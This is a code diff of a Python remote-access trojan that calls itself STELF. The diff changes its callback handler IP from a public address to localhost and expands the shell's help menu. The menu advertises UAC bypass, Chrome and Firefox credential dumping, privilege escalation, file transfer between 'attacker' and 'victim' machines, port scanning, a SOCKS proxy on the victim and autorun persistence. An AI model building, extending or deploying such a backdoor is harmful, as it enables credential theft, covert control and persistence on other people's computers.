@@ -39,7 +39,7 @@ try:
 		HANDLER_IP = HANDLER_IP[:-1]
 except Exception as e:
 	logging.debug("We're uncompyled, let's use these values...")
-	HANDLER_IP = "88.156.10.253"
+	HANDLER_IP = "127.0.0.1"
 	HANDLER_PORT = 8080
 
 def windows_only(func):
@@ -621,13 +621,17 @@ class Shell:
 				return False
 			elif data == "help" or data == "?":
 				output = '''Commands:
-isadmin - Returns whether current user is admin or not
-bypassuac - Bypasses UAC
-dumpchrome - Dumps Chrome Credentials
-dumpff - Dumps Firefox Credientials
-die - Quit the shell
+isadmin - Returns whether the current process has admin privileges.
+bypassuac - Bypasses UAC.
+dumpchrome - Dumps Chrome credentials.
+dumpff - Dumps Firefox credientials.
+die - Quit the shell.
 getsystem - Get the system and escalate privs!
-download $file - Download a file to attacker machine.
+download [file] - Download a file to attacker machine.
+upload [file] - Upload file to victim machine.
+portscan [hosts] [ports] - Perform a port scan on given hosts.
+proxy start - Start SOCKSv4 proxy on victim.
+persist - Add STELF to autorun.
 help - This menu!
 '''
 			elif data.startswith("cd"):
